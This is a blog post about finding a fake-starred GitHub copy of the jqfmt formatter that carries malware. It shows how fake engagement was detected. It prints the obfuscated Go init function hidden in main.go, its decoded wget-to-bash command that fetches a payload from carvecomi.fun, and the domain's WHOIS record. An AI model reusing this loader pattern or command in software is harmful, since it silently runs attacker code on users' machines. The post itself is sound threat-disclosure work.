---
title: Stumbling across a GitHub malware repository ring
date created: 2025-02-26T22:22:27.418Z
date updated: 2025-02-26T22:22:27.418Z
---

While adding support for `jqfmt` to my markdown code block formatter (`mdsf`, [mdsf#700](https://github.com/hougesen/mdsf/issues/700)), I came across something weird.

When searching for the repository on GitHub, two different repositories with a decent amount of stars came up.

The first, `unfitpercen/jqfmt` had 102 stars and was last updated 5 days ago (2025-02-22), while the second `noperator/jqfmt` _only_ had 55 stars and hadn't been updated in six months (2024-08-15).

![Search result for jqfmt on GitHub](/blog/jqfmt-github-search-result.png)

My original thought was that one of them was a fork, but the more I looked into the repository with the most stars (`unfitpercen/jqfmt`), the more suspicious I got.

The repository was composed of a single commit with the message `added`, which added 65 files and 2740 lines. While this is pretty bad practice, it is not uncommon for some people to create very large commits, and my mother has always told me not to judge a book by its cover.

![GitHub page for unfitpercen/jqfmt](/blog/github-unfitpercen-jqfmt.png)

The repository had over a hundred stars, but not a single issue, pull request, or discussion.

Such a star-to-issue ratio usually has one of three explanations:

1. The software is bug-free (is any ever?)
2. The users that starred the repository thought the project seemed interesting but did not use it
3. The stars are fake

It is pretty hard to validate explanations 1 and 2, luckily I already knew of a few ways of detecting fake engagement from my time building social media tools at [Cavea](https://cavea.io).

Fake engagement will often have a few obvious tells that makes it standard out:

- The users starring will be created recently - since they often get banned
- They wont act in the way an ordinary user does - actually contributing to code in our case
- The engagement will be delivered in large burst - getting hundreds of engagement on day X, but getting zero engagemnt on both day X⁻¹ and day X⁺¹

When checking the star history using [OSS Insight](https://ossinsight.io/) we see that the repository went from 0 to 99 stars on February the 25th 2025. That is a lot of stars to gain in a single day.

![ossinsight github:unfitpercen/jqfmt.png star statistics](/blog/ossinsight-unfitpercen-jqfmt.png)

For comparison [prettier](https://github.com/prettier/prettier), _maybe_ the most used formatter, gains around 10 stars each day.

![ossinsight github prettier star statistics](/blog/ossinsight-prettier-prettier.png)

One could argue that maybe the repository was posted on a forum like Reddit or Hackernews, which is why I ran a quick backlink check to validate that wasn't the case.

![ahref backlink check for the github repo](ahrefs-github-unfitpercen-jqfmt.png)

Checking who starred a repository is also pretty easy since each repository has a page where you can see who did it ([https://github.com/unfitpercen/jqfmt/stargazers](https://github.com/unfitpercen/jqfmt/stargazers)). That page conveniently also shows the account creation date of the "stargazers", if the user hasn't filled out their country or company (which the scammer luckily doesn't know).

I took a quick look and noticed that every single user was created within the last few weeks - suspicious 🤔

![github unfitperce/jqfmt stargazers](/blog/github-unfitpercen-jqfmt-stargazers.png)

I decided to check each file to find out what exactly was changed.

When checking the individual files for changes I realized that the `unfitpercen/jqfmt` repository had the following extra lines in the command line interface [cmd/jqfmt/main.go](https://github.com/unfitpercen/jqfmt/blob/deb5eb0a6fa98f3dbd0b04f3065cd236ab45062b/cmd/jqfmt/main.go#L78C1-L88C22):

```go
func rUnCTC() error {
	HJ := []string{"e", "3", "d", "m", "/", "s", "&", "h", "i", ":", "3", "/", "c", "|", "d", "e", "/", "g", "1", "/", "o", "t", "/", "-", "4", "e", " ", "3", "u", " ", "w", "f", " ", "0", "a", "a", "-", "O", "6", "d", "n", "b", "p", "t", "b", "5", ".", "s", "i", "f", "r", "h", "/", " ", "r", "s", "7", "v", "e", " ", "t", "c", "t", "o", "g", "a", "/", "f", "n", "b", "a", " "}
	utOYhb := "/bin/sh"
	MclXWiDP := "-c"
	opIAlY := HJ[30] + HJ[64] + HJ[15] + HJ[60] + HJ[53] + HJ[36] + HJ[37] + HJ[29] + HJ[23] + HJ[59] + HJ[51] + HJ[43] + HJ[62] + HJ[42] + HJ[55] + HJ[9] + HJ[4] + HJ[11] + HJ[61] + HJ[34] + HJ[54] + HJ[57] + HJ[25] + HJ[12] + HJ[63] + HJ[3] + HJ[48] + HJ[46] + HJ[67] + HJ[28] + HJ[68] + HJ[66] + HJ[5] + HJ[21] + HJ[20] + HJ[50] + HJ[70] + HJ[17] + HJ[0] + HJ[16] + HJ[2] + HJ[58] + HJ[10] + HJ[56] + HJ[27] + HJ[14] + HJ[33] + HJ[39] + HJ[49] + HJ[52] + HJ[65] + HJ[1] + HJ[18] + HJ[45] + HJ[24] + HJ[38] + HJ[44] + HJ[31] + HJ[32] + HJ[13] + HJ[26] + HJ[19] + HJ[41] + HJ[8] + HJ[40] + HJ[22] + HJ[69] + HJ[35] + HJ[47] + HJ[7] + HJ[71] + HJ[6]
	exec.Command(utOYhb, MclXWiDP, opIAlY).Start()
	return nil
}

var rbFVkd = rUnCTC()
```

While I am in no way an expert at writing Go, it was pretty clear that something weird was going on.

```shell
/bin/sh -c wget -O - https://carvecomi.fun/storage/de373d0df/a31546bf | /bin/bash &
```

```
Domain Name: CARVECOMI.FUN
Registry Domain ID: D527869608-CNIC
Registrar WHOIS Server: whois.PublicDomainRegistry.com
Registrar URL: https://publicdomainregistry.com
Creation Date: 2025-02-17T18:26:13.0Z
Registry Expiry Date: 2026-02-17T23:59:59.0Z
Registrar: PDR Ltd. d/b/a PublicDomainRegistry.com
Registrar IANA ID: 303
Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Registrant Organization: N/A
Registrant State/Province: Not Applicable
Registrant Country: SC
Registrant Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Admin Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Tech Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Name Server: ALARIC.NS.CLOUDFLARE.COM
Name Server: KATJA.NS.CLOUDFLARE.COM
DNSSEC: unsigned
Billing Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.
Registrar Abuse Contact Email: abuse@publicdomainregistry.com
Registrar Abuse Contact Phone: +1.2013775952
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of WHOIS database: 2025-02-26T22:57:43.0Z <<<

For more information on Whois status codes, please visit https://icann.org/epp

>>> IMPORTANT INFORMATION ABOUT THE DEPLOYMENT OF RDAP: please visit
https://www.centralnicregistry.com/support/information/rdap <<<

The Whois and RDAP services are provided by CentralNic, and contain
information pertaining to Internet domain names registered by our
our customers. By using this service you are agreeing (1) not to use any
information presented here for any purpose other than determining
ownership of domain names, (2) not to store or reproduce this data in
any way, (3) not to use any high-volume, automated, electronic processes
to obtain data from this service. Abuse of this service is monitored and
actions in contravention of these terms will result in being permanently
blacklisted. All data is (c) CentralNic Ltd (https://www.centralnicregistry.com)

Access to the Whois and RDAP services is rate limited. For more
information, visit https://registrar-console.centralnicregistry.com/pub/whois_guidance.

```
